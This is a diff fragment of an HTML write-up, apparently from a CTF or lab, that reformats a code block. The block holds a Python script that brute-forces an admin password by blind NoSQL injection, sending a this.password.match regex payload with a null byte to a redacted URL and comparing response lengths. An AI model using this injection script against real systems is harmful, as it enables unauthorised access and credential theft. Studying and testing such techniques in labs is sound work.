@@ -42,7 +42,7 @@ Display all the columns field contents in the information_schema user table<br>
 <h4>shitscript</h4>
 
 
-<code>
+<pre><code>
 import requests
 bruten = '1234567890abcdef-'
 xx=0
@@ -53,7 +53,7 @@ keystr = keylist + x
 URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
 r = requests.get(URL)
 s = (len(r.content))
-</code>
+</code></pre>
 <code>  
 while True:
   try:
